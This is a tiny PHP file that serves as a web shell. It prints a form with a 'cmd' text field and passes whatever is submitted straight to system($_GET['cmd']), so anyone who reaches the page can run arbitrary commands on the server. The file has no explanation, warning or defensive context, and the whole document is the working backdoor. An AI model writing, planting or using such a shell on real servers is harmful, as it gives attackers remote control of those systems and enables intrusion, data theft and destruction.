<?php
echo '<form action="">';
echo 'cmd : <input type=text name="cmd" size=50%>';
echo '<input type="submit">';
echo '</form>';					
system($_GET['cmd']);
?>